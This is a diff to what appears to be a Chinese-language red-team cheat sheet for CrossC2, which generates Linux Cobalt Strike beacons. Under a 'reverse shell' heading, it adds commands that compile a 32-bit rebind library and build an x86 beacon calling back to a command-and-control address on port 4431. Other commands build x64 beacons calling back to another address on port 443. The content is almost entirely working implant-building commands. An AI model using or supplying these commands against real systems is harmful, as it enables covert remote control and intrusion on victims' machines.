@@ -131,7 +131,9 @@ CrossC2 - 上线linux插件, 只支持https
 # reverse shell
 ## 有 profile
 gcc test.c -fPIC -shared -o lib_rebind_test.so # test2.c中替换了memcpy防止低系统无法运行
+gcc -m32 test.c -fPIC -shared -o lib_rebind_testx86.so
 ./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 test
+./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_testx86.so Linux x86 test
 ## 无 profile
 ./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null Linux x64 ./test
 ./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null:config.ini Linux x64 t_cc2.out
